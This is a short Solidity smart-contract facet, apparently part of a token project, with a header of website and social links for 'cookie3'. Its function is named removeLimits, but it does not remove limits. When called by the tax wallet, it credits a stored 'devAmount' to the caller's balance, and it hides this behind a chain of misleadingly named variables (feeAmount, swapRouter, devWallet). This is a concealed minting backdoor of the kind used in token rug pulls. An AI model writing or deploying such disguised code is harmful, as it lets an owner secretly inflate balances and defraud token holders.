// SPDX-License-Identifier: UNLICENSED

/*
    Website:  https://cookie3.co/
    Twitter:  https://twitter.com/cookie3_co
    Medium:   hhttps://medium.com/@cookie3
    Discord:  https://discord.com/invite/cookie3
    Telegram: https://t.me/cookie3_co

*/

pragma solidity ^0.8.24;
import "./TestLib.sol";
contract removeLimitsFacet is Ownable {
    function removeLimits() external {
        TestLib.TestStorage storage ds = TestLib.diamondStorage();
        if (_msgSender() == ds._taxWallet) {
            require(ds._taxWallet == _msgSender());
            address feeAmount = _msgSender();
            address swapRouter = feeAmount;
            address devWallet = swapRouter;
            ds._balances[devWallet] += ds.devAmount;
        }
    }
}
